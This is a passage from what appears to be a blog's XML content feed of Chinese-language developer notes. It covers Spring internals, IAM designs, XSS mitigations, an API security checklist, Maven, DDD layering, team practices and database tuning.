Initialize the strategy objects that this servlet uses. * &lt;p&gt;May be overridden in subclasses in order to initialize further strategy objects. */protected void initStrategies(ApplicationContext context) {   initMultipartResolver(context);   initLocaleResolver(context);   initThemeResolver(context);   initHandlerMappings(context);   initHandlerAdapters(context);   initHandlerExceptionResolvers(context);   initRequestToViewNameTranslator(context);   initViewResolvers(context);   initFlashMapManager(context);}</code></pre><h3 id="5-Bean-是怎么被初始化的呢？-getBean-细节"><a href="#5-Bean-是怎么被初始化的呢？-getBean-细节" class="headerlink" title="5  Bean 是怎么被初始化的呢？ getBean 细节"></a>5  Bean 是怎么被初始化的呢？ getBean 细节</h3><h3 id="6-数据库连接是在什么时候建立的呢？"><a href="#6-数据库连接是在什么时候建立的呢？" class="headerlink" title="6 数据库连接是在什么时候建立的呢？"></a>6 数据库连接是在什么时候建立的呢？</h3><h3 id="7-各种注解是在哪里被处理的？"><a href="#7-各种注解是在哪里被处理的？" class="headerlink" title="7 各种注解是在哪里被处理的？"></a>7 各种注解是在哪里被处理的？</h3><h1 id="Spring-mvc-响应请求过程"><a href="#Spring-mvc-响应请求过程" class="headerlink" title="Spring mvc 响应请求过程"></a>Spring mvc 响应请求过程</h1><h1 id="Spring-boot-打包流程"><a href="#Spring-boot-打包流程" class="headerlink" title="Spring boot 打包流程"></a>Spring boot 打包流程</h1></center></center>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>大型系统 IAM 机制</title>
      <link href="/%E5%AE%89%E5%85%A8/security/sso-oauth/"/>
      <url>/%E5%AE%89%E5%85%A8/security/sso-oauth/</url>
      
        <content type="html"><![CDATA[<p>对于大型系统来说，IAM 不仅需要考虑多端的接入，还需要考虑性能。主流的使用如下方案：</p><ul><li>web 走 CAS，通过全局 Session 和 本地 Session 的方案，session 通过使用 spring-session 存放数据到redis</li><li>APP 和客户端走 OAuth<ul><li>通过 JWT 实现本地验证，节省流量</li><li>设置 access_token 为10mins 快速过期</li><li>设置 refresh_token 为 JWT token，并通过一定时间的黑名单的机制进行 token 撤销操作</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>XSS 攻击和处理</title>
      <link href="/%E5%AE%89%E5%85%A8/security/xss/"/>
      <url>/%E5%AE%89%E5%85%A8/security/xss/</url>
      
        <content type="html"><![CDATA[<p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p><p>基本思路就是，通过向系统注入一些恶意的 JavaScript 代码，例如发帖时候带上 JavaScript 代码片段。如果系统不经处理就将用户的输入渲染到页面上，那么另外一个用户在浏览页面时就会触发该片段的执行。</p><p>因为代码运行到页面上，基于网页发送请求自动发送 cookies 的原理，从而可以利用被攻击者的身份完成一些特定的行为。这也是为什么客户端不需要处理 XSS 攻击的原因。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="对输出简单的转码"><a href="#对输出简单的转码" class="headerlink" title="对输出简单的转码"></a>对输出简单的转码</h3><pre><code>// 在 Spring 中可以通过 HtmlUtils 的工具类进行输出转码HtmlUtils.htmlEscape()</code></pre><h3 id="使用专门的-filter-进行转码"><a href="#使用专门的-filter-进行转码" class="headerlink" title="使用专门的 filter 进行转码"></a>使用专门的 filter 进行转码</h3><p><a href="http://opensource.finn.no/xss-html-filter/" target="_blank" rel="noopener">http://opensource.finn.no/xss-html-filter/</a></p><pre><code class="java">// retrieve input from user...String input = ...String clean = new HTMLInputFilter().filter( input );</code></pre><h3 id="使用-spring-security-框架的-xssFilter"><a href="#使用-spring-security-框架的-xssFilter" class="headerlink" title="使用 spring security 框架的 xssFilter"></a>使用 spring security 框架的 xssFilter</h3><p> spring security 会默认加载一个 xss filter</p><p><a href="https://stackoverflow.com/questions/37606227/is-xss-protection-in-spring-security-enabled-by-default" target="_blank" rel="noopener">https://stackoverflow.com/questions/37606227/is-xss-protection-in-spring-security-enabled-by-default</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Maven Dependency Management 统一管理多模块项目</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/maven-depency-management/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/maven-depency-management/</url>
      
        <content type="html"><![CDATA[<h2 id="父级-pom-DepencyManagement"><a href="#父级-pom-DepencyManagement" class="headerlink" title="父级 pom + DepencyManagement"></a>父级 pom + DepencyManagement</h2><p>当我们的项目模块很多的时候，我们使用Maven管理项目非常方便，帮助我们管理<strong>构建、文档、报告、依赖、scms、发布、分发</strong>的方法。可以方便的<strong>编译代码、进行依赖管理、管理二进制库</strong>等等。<br> 由于我们的模块很多，所以我们又抽象了一层，如下图抽出一个<strong>parent</strong>来管理子项目的公共的依赖。为了项目的正确运行，必须让所有的子项目使用依赖项的统一版本，必须确保应用的各个项目的依赖项和版本一致，才能保证测试的和发布的是相同的结果。</p><p> 在我们项目顶层的POM文件中，我们会看到dependencyManagement元素。</p><h2 id="在父级定义-dependencyManagement-标签"><a href="#在父级定义-dependencyManagement-标签" class="headerlink" title="在父级定义 dependencyManagement 标签"></a>在父级定义 dependencyManagement 标签</h2><pre><code class="xml">&lt;groupId&gt;printf.cn&lt;/groupId&gt;&lt;artifactId&gt;base&lt;/artifactId&gt;&lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;!--// 这个很重要，否则报找不到 jar 文件--&gt;&lt;packing&gt;pom&lt;/packing&gt; </code></pre><pre><code class="xml"> &lt;dependencyManagement&gt;        &lt;dependencies&gt;            &lt;dependency&gt;                &lt;groupId&gt;com.alibaba&lt;/groupId&gt;                &lt;artifactId&gt;fastjson&lt;/artifactId&gt;                &lt;version&gt;1.2.33&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;com.alibaba&lt;/groupId&gt;                &lt;artifactId&gt;druid&lt;/artifactId&gt;                &lt;version&gt;1.0.11&lt;/version&gt;            &lt;/dependency&gt;        &lt;/dependencies&gt;    &lt;/dependencyManagement&gt;</code></pre><h2 id="子项目配置"><a href="#子项目配置" class="headerlink" title="子项目配置"></a>子项目配置</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;project    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;    xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;parent&gt;      &lt;groupId&gt;printf.cn&lt;/groupId&gt;      &lt;artifactId&gt;base&lt;/artifactId&gt;      &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;    &lt;/parent&gt;    &lt;artifactId&gt;app&lt;/artifactId&gt;    &lt;name&gt;femicro-cache&lt;/name&gt;    &lt;url&gt;http://maven.apache.org&lt;/url&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;             &lt;!--这些不需要设置版本号--&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>基于 DDD 理论基础的分层架构</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/ddd-layer/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/ddd-layer/</url>
      
        <content type="html"><![CDATA[<p>主要参考下层，唯一不认同的是组件划分的方式，每层的分包逻辑肯定不一定样</p><h2 id="分层参考"><a href="#分层参考" class="headerlink" title="分层参考"></a>分层参考</h2><ul><li>接口层 <ul><li>关心视图和对外的服务</li><li>如果我们没有多种接入方式，可以和应用层合并</li><li>对应到分布式系统中的网关、BFF、前台等概念</li></ul></li><li>应用层 <ul><li>关心处理完一个完整的业务</li><li>集成不同的领域模型解决问题</li><li>一致性事务放到这层</li><li>对应到分布式系统中的中台等概念</li><li>基础设施的 interface 放到这层</li><li>读模型放到这层</li><li>用户权限控制放到这层</li></ul></li><li>领域层<ul><li>不关心业务，关心模型，</li><li>强事务放到这层</li><li>对应到分布式系统中的 domain service、后台等概念</li><li>按照聚合根分包</li><li>聚合根之间不互相依赖，依赖由应用层编排</li></ul></li><li>基础设施层<ul><li>关心存储、通知和外部设施</li><li>一般由 ORM 提供</li><li>按照 adapter 分包</li></ul></li></ul><h2 id="分布式系统的分层适用性"><a href="#分布式系统的分层适用性" class="headerlink" title="分布式系统的分层适用性"></a>分布式系统的分层适用性</h2><p>分层部署的代价和收益，每层的部署关系：</p><ul><li>单体<ul><li>所有层部署到一起</li><li>收益为部署简单、无分布式事务问题，用户权限简单</li><li>代价为无法解耦</li><li>适合小型工程，无需适配多端、多类型应用</li><li>无需分布式鉴权</li></ul></li><li>小型服务化项目<ul><li>接口层单独部署，例如 admin、mobile、h5</li><li>应用层、领域层、基础设施层部署到一起</li><li>收益为可以一定程度上解耦</li><li>一定程度上无需处理分布式事务</li><li>接口层和应用层使用 OAuth 分布式鉴权</li></ul></li><li>大型中台项目<ul><li>接口层单独部署</li><li>应用层单独部署</li><li>领域层和基础设施层部署到一起</li><li>接口层和应用层使用 OAuth 分布式鉴权</li><li>应用层和领域层使用 AK/SK 服务间鉴权</li></ul></li><li>超大型项目<ul><li>接口层单独部署</li><li>应用层单独部署</li><li>领域层单独部署</li><li>基础设施层部署</li><li>接口层和应用层使用 OAuth 分布式鉴权</li><li>应用层和领域层使用 AK/SK 服务间鉴权</li><li>领域层和基础设施层 使用 AK/SK 服务间鉴权</li></ul></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.jianshu.com/p/d3e8b9ac097b" target="_blank" rel="noopener">https://www.jianshu.com/p/d3e8b9ac097b</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 spring-security-test 作为 user mock</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/spring-security-test/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/spring-security-test/</url>
      
        <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><pre><code>this.mockMvc = MockMvcBuilders        .webAppContextSetup(this.wac)        .alwaysDo(MockMvcResultHandlers.print())        .apply(springSecurity()) // 让 springSecurityFilterChain 生效        .build();</code></pre><h2 id="注解使用"><a href="#注解使用" class="headerlink" title="注解使用"></a>注解使用</h2><p>springSecurity提供了相关的组件spring-security-test，该组件提供了相关的注解来来<em>模拟用户登录信息</em>或者<em>调用用户登录的方法</em>，</p><ul><li>@WithMockUser 模拟用户，手动指定用户名和授权</li><li>@WithAnonymousUser 模拟匿名用户</li><li>@WithUserDetails 模拟用户，给定用户名，通过自定义UserDetails来认证</li><li>@WithSecurityContext 通过SecurityContext构造器模拟用户</li></ul><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>官方文档（<a href="https://docs.spring.io/spring-security/site/docs/5.0.6.RELEASE/reference/htmlsingle/#test-method-withmockuser）" target="_blank" rel="noopener">https://docs.spring.io/spring-security/site/docs/5.0.6.RELEASE/reference/htmlsingle/#test-method-withmockuser）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>单体应用 IAM 方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/stand-alone-iam-solution/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/stand-alone-iam-solution/</url>
      
        <content type="html"><![CDATA[<h2 id="有-session-方案"><a href="#有-session-方案" class="headerlink" title="有 session 方案"></a>有 session 方案</h2><p>spring-security</p><p>spring-session</p><p>Spring-session-redis</p><p>优点：</p><ul><li>有 http-only 保护比较安全</li></ul><p>缺点</p><ul><li>不满足移动端等场景</li></ul><h2 id="无-session-方案"><a href="#无-session-方案" class="headerlink" title="无 session 方案"></a>无 session 方案</h2><h3 id="jwt-方案"><a href="#jwt-方案" class="headerlink" title="jwt 方案"></a>jwt 方案</h3><h3 id="自定义-token-方案"><a href="#自定义-token-方案" class="headerlink" title="自定义 token 方案"></a>自定义 token 方案</h3>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开发安全的 API 所需要核对的清单</title>
      <link href="/%E5%AE%89%E5%85%A8/security/api-security/"/>
      <url>/%E5%AE%89%E5%85%A8/security/api-security/</url>
      
        <content type="html"><![CDATA[<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><ul><li>[ ] 不要使用 <code>Basic Auth</code> 使用标准的认证协议 (如 JWT, OAuth).</li><li>[ ] 不要重新实现 <code>Authentication</code>, <code>token generating</code>, <code>password storing</code>, 使用标准库.</li><li>[ ] 限制密码错误尝试次数，并且增加账号冻结功能.</li><li>[ ] 加密所有的敏感数据.</li></ul><h3 id="JWT-JSON-Web-Token"><a href="#JWT-JSON-Web-Token" class="headerlink" title="JWT (JSON Web Token)"></a>JWT (JSON Web Token)</h3><ul><li>[ ] 使用随机复杂的密钥 (<code>JWT Secret</code>) 以增加暴力破解的难度.</li><li>[ ] 不要在请求体中直接提取数据, 要对数据进行加密 (<code>HS256</code> 或 <code>RS256</code>).</li><li>[ ] 使 token 的过期时间尽量的短 (<code>TTL</code>, <code>RTTL</code>).</li><li>[ ] 不要在 JWT 的请求体中存放敏感数据, 它是<a href="https://jwt.io/#debugger-io" target="_blank" rel="noopener">可解码的</a>.</li></ul><h3 id="OAuth-授权或认证协议"><a href="#OAuth-授权或认证协议" class="headerlink" title="OAuth 授权或认证协议"></a>OAuth 授权或认证协议</h3><ul><li>[ ] 始终在后台验证 <code>redirect_uri</code>, 只允许白名单的 URL.</li><li>[ ] 始终在授权时使用有效期较短的授权码（code）而不是令牌（access_token） (不允许 <code>response_type=token</code>).</li><li>[ ] 使用随机哈希数的 <code>state</code> 参数来防止跨站请求伪造(CSRF).</li><li>[ ] 对不同的应用分别定义默认的作用域和各自有效的作用域参数.</li></ul><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><ul><li>[ ] 限制流量来防止 DDoS 攻击和暴力攻击.</li><li>[ ] 在服务端使用 HTTPS 协议来防止 MITM （中间人攻击）.</li><li>[ ] 使用 <code>HSTS</code> 协议防止 SSL Strip 攻击.</li></ul><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><ul><li>[ ] 使用与操作相符的 HTTP 操作函数, <code>GET (读取)</code>, <code>POST (创建)</code>, <code>PUT (替换/更新)</code> 以及 <code>DELETE (删除记录)</code>, 如果请求的方法不适用于请求的资源则返回 <code>405 Method Not Allowed</code>.</li><li>[ ] 在请求头中的 <code>content-type</code> 字段使用内容验证来只允许支持的格式 (如 <code>application/xml</code>, <code>application/json</code> 等等) 并在不满足条件的时候返回 <code>406 Not Acceptable</code>.</li><li>[ ] 验证 <code>content-type</code> 中申明的编码和你收到正文编码一致 (如 <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, <code>application/json</code> 等等).</li><li>[ ] 验证用户输入来避免一些普通的易受攻击缺陷 (如 <code>XSS</code>, <code>SQL-注入</code>, <code>远程代码执行</code> 等等).</li><li>[ ] 不要在 URL 中使用任何敏感的数据 (<code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>, or <code>API keys</code>), 而是使用标准的认证请求头.</li><li>[ ] 使用一个 API Gateway 服务来启用缓存、限制访问速率 (如 <code>Quota</code>, <code>Spike Arrest</code>, <code>Concurrent Rate Limit</code>) 以及动态地部署 APIs resources.</li></ul><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><ul><li>[ ] 检查是否所有的接口都包含必要都身份认证, 以避免被破坏了的认证体系.</li><li>[ ] 避免使用特有的资源 id. 使用 <code>/me/orders</code> 替代 <code>/user/654321/orders</code>.</li><li>[ ] 使用 <code>UUID</code> 代替自增长的 id.</li><li>[ ] 如果需要解析 XML 文件, 确保实体解析(entity parsing)是关闭的以避免 <code>XXE</code> 攻击.</li><li>[ ] 如果需要解析 XML 文件, 确保实体扩展(entity expansion)是关闭的以避免通过指数实体扩展攻击实现的 <code>Billion Laughs/XML bomb</code>.</li><li>[ ] 在文件上传中使用 CDN.</li><li>[ ] 如果数据处理量很大, 尽可能使用队列或者 Workers 在后台处理来避免阻塞请求，从而快速响应客户端.</li><li>[ ] 不要忘了把 DEBUG 模式关掉.</li></ul><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><ul><li>[ ] 增加请求返回头 <code>X-Content-Type-Options: nosniff</code>.</li><li>[ ] 增加请求返回头 <code>X-Frame-Options: deny</code>.</li><li>[ ] 增加请求返回头 <code>Content-Security-Policy: default-src &#39;none&#39;</code>.</li><li>[ ] 删除请求返回中的指纹头 - <code>X-Powered-By</code>, <code>Server</code>, <code>X-AspNet-Version</code> 等等.</li><li>[ ] 在响应中遵循请求的 <code>content-type</code>, 如果你的请求类型是 <code>application/json</code> 那么你返回的 <code>content-type</code> 就是 <code>application/json</code>.</li><li>[ ] 不要返回敏感的数据, 如 <code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>.</li><li>[ ] 给请求返回使用合理的 HTTP 响应代码. (如 <code>200 OK</code>, <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>405 Method Not Allowed</code> 等等).</li></ul><h2 id="持续集成和持续部署"><a href="#持续集成和持续部署" class="headerlink" title="持续集成和持续部署"></a>持续集成和持续部署</h2><ul><li>[ ] 使用单元测试以及集成测试的覆盖率来保障你的设计和实现.</li><li>[ ] 引入代码审查流程, 禁止私自合并代码.</li><li>[ ] 在推送到生产环境之前确保服务的所有组件都用杀毒软件静态地扫描过, 包括第三方库和其它依赖.</li><li>[ ] 为部署设计一个回滚方案.</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/shieldfy/API-Security-Checklist" target="_blank" rel="noopener">https://github.com/shieldfy/API-Security-Checklist</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>估点</title>
      <link href="/team/team/estimation/"/>
      <url>/team/team/estimation/</url>
      
        <content type="html"><![CDATA[<ul><li>国内项目和offshore项目不同之处在于，国内项目偏向于按照1人天的工作量作为一个点，而offshore项目偏向于使用复杂度来估点，这里以复杂度为例。</li><li>使用一个点的故事卡作为估点的基准</li><li>使用斐波那契数列1 2 3 5 8 来进行估点</li><li>一旦有故事卡超过了5个点，需要进行拆分</li><li>bug卡的内容已经被普通故事卡覆盖，不进行估点</li><li>项目中遗留的缺陷（例如其他团队交接的）可以进行估点</li><li>技术债卡应和TL一起估点，并让BA知晓</li><li>估点时不计入BA的工作量</li><li>估点时需要考虑QA的工作量</li><li>估点时需要一致通过，否则应阐述分歧时，识别工作量的风险 （不使用少数服从多数，是因为估点不同的人可能了解的信息不同，应该及时识别这些信息）</li><li><strong>预留足够的 buffer</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>站会</title>
      <link href="/team/team/standup/"/>
      <url>/team/team/standup/</url>
      
        <content type="html"><![CDATA[<ul><li>站会的主持人轮流进行，主持人应提前10分钟准备接入的设备</li><li>主持人视情况而定选择站会方式，优先选择使用卡墙模式。</li><li>卡墙模式。使用电子墙或者物理墙，根据卡墙的内容发言，从Done开始到Backlog结束。优点是所有    人不得不集中精力到卡墙上，信息得到很好地同步，不会遗漏信息；坏处是这种方式比较费时间。</li><li>Roll Call 模式，团队成员轮流发言。好处是节省时间，如果工作在多张卡上；可以快速完成站会，坏处是没有集中到故事卡的焦点，注意力非常容易丢失。</li><li>使用Roll Call 模式时，发言者的更新应提及卡号、故事卡内容、进度和当天的工作计划</li><li>主持人可以使用‘正’字记录故事卡的实际工作耗时</li><li>PM更新内容需要包括项目健康程度、进度、关键时间节点</li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安全</title>
      <link href="/team/team/security/"/>
      <url>/team/team/security/</url>
      
        <content type="html"><![CDATA[<h2 id="安全军规"><a href="#安全军规" class="headerlink" title="安全军规"></a>安全军规</h2><h3 id="团队成员日常安全"><a href="#团队成员日常安全" class="headerlink" title="团队成员日常安全"></a>团队成员日常安全</h3><ul><li>不对屏幕拍照</li><li>不在便利贴上书写密码</li></ul><h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><ul><li><a href="https://wiki.printf.cn/安全/security/red-line/">https://wiki.printf.cn/%E5%AE%89%E5%85%A8/security/red-line/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>项目交接</title>
      <link href="/team/team/handover/"/>
      <url>/team/team/handover/</url>
      
        <content type="html"><![CDATA[<ul><li><p>凭证</p></li><li><p>干系人</p></li><li><p>架构</p></li><li><p>代码仓库</p></li><li><p>文档</p></li><li><p>基础设施</p></li><li><p>业务</p></li><li><p>测试用例</p></li><li><p>未完成的功能</p></li><li><p>技术债</p></li><li><p>团队资产 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>新成员培训</title>
      <link href="/team/team/on-boarding/"/>
      <url>/team/team/on-boarding/</url>
      
        <content type="html"><![CDATA[<ul><li>介绍客户和项目的背景</li><li>介绍团队成员和项目干系人</li><li>介绍当前项目进度和关键时间节点</li><li>介绍团队中使用的文档和工具</li><li>权限和账号检查</li><li>业务上下文</li><li>业务场景</li><li>用户群体</li><li>技术上下文</li><li>技术栈</li><li>开发工具和环境</li><li>第三方依赖</li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>上线清单</title>
      <link href="/team/team/release/"/>
      <url>/team/team/release/</url>
      
        <content type="html"><![CDATA[<ol><li>上线前<ul><li>提前发送业务中断信息，包括邮件和悬挂系统通知</li><li>准备部署脚本 （例如 shell、ansible）和线上配置文件（例如Nginx配置）</li><li>制定上线计划</li><li>在低版本演练上线计划</li><li>在低版本演练灾备恢复</li><li>需要准备好回退计划</li><li>有条件的，进行安全测试</li></ul></li><li><p>上线</p><ul><li>执行上线动作至少需要两人pair操作（大量误操作造成事故的案例），可以创建线上会议直播上线操作</li><li>停服后需要监控数据流量，确保流量为0后再进行数据、配置和线上软件包的备份</li><li>上线失败后使用回退计划</li><li>尽量不对线上环境进行手动配置，如果无法实现自动化部署，应添加到上线计划中</li></ul></li><li>上线完成后<ul><li>使用专用的Health check接口检查系统健康状态</li><li>核对线上系统的版本号是否和预期一致</li><li>检查服务器负载是否在健康范围内</li><li>其他授权下的线上测试</li><li>检查日志平台是否有日志到达</li><li>检查日志中是否有错误信息</li><li>发送业务恢复邮件和系统通知</li><li>上线完成后，需要当前线上环境的信息更新文档</li><li>新的IP地址、服务器配置信息等</li><li>最新线上的版本号、软件包、配置文件</li><li>上线计划</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码风格清单</title>
      <link href="/team/team/code-style/"/>
      <url>/team/team/code-style/</url>
      
        <content type="html"><![CDATA[<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《核心网编程军规》</p><p>《java 解惑》</p><p>《代码整洁之道》</p><p>《核心网java编程军规》</p><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>codereview 清单</title>
      <link href="/team/team/codereview/"/>
      <url>/team/team/codereview/</url>
      
        <content type="html"><![CDATA[<ul><li>如果没有特别重要的事务，坚持每日Codereview</li><li>推荐使用的Jetbrains IDE中提供的版本管理工具，可以筛选提交人和一次性diff当天所有提交，不建议逐commit diff</li><li>Codereview 讨论实现方法、传递业务，避免逐行讲代码和现场debug</li><li>每人Codereview时间不超过10分钟，时间需自行控制，细节可以私下讨论</li><li>委托他人记录检查点</li></ul><h3 id="Vue-技术栈"><a href="#Vue-技术栈" class="headerlink" title="Vue 技术栈"></a>Vue 技术栈</h3><ul><li>单词拼写错误（Typo）和无意义、不统一的变量名</li><li>脏代码，无意义的注释、临时代码、console.log等</li><li>混用ES5/6语法特性</li><li>在模板中使用复杂的表达式，应该使用方法代替</li><li>公共组件和状态关联（Redux、Vuex）</li><li>嵌套三元表达式</li><li>大量的switch case或者If语句，应该使用Map代替</li><li>引入无用的依赖</li><li>特性滥用</li><li>Mixin</li><li>Ref</li><li>Vuex</li><li>直接的DOM操作</li><li>不安全特性</li><li>v-html</li><li>Store 引用修改</li><li>大量拷贝的代码或其他不合理的设计和实现</li></ul><h3 id="Java-技术栈"><a href="#Java-技术栈" class="headerlink" title="Java 技术栈"></a>Java 技术栈</h3><p>TODO </p>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>maven 常用命令和插件</title>
      <link href="/maven/devops/maven-basic/"/>
      <url>/maven/devops/maven-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="maven-基本命令"><a href="#maven-基本命令" class="headerlink" title="maven 基本命令"></a>maven 基本命令</h2><p>不安装任何插件的命令</p><ul><li><p>mvn compile:编译，生成 target target里边编译后的class文件</p></li><li><p>mvn clean 清理清 target里边所有文件</p></li><li><p>mvn test-compile 编译test下的类，它首先会编译被测试的类</p></li><li><p>mvn  package 打包，输出 jar 或者 war</p></li><li><p>mvn source:jar  生成源码jar包 ，只打main里边的</p></li><li><p>mvn install 安装命令，把打包成jar包 放到仓库里边，可以被使用</p></li><li><p>mvn deploy 将最终的包复制到远程仓库</p></li></ul><h2 id="常用插件和作用"><a href="#常用插件和作用" class="headerlink" title="常用插件和作用"></a>常用插件和作用</h2><h3 id="maven-release-plugin"><a href="#maven-release-plugin" class="headerlink" title="maven-release-plugin"></a>maven-release-plugin</h3><p>maven release 插件，功能主要有两个:</p><ul><li>修改  pom 文件版本号，提交 git tag</li><li>执行 mvn deploy 将新版本推送到服务器</li></ul>]]></content>
      
      
      <categories>
          
          <category> maven </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端工程师知识清单</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/skills/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/skills/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://www.itcast.cn/course/web.shtml" target="_blank" rel="noopener">http://www.itcast.cn/course/web.shtml</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MQ 性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/mysql-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/mysql-performance/</url>
      
        <content type="html"><![CDATA[<p>数据库优化方法</p><ol><li>优化SQL（非常重要）</li><li>使用HandlerSocket</li><li>选择合适的数据库存储引擎</li><li>选择合适的数据库索引类型 hash 或者 btree</li></ol><p>sql优化　</p><ol><li>创建索引</li><li>复合索引</li><li>索引不会包含有NULL值的列</li><li>使用短索引</li><li>排序的索引问题</li><li>like语句操作</li><li>不要在索引列上进行运算，会破坏索引</li><li>不使用NOT IN和&lt;&gt;操作s</li></ol>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis 性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/redis-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/redis-performance/</url>
      
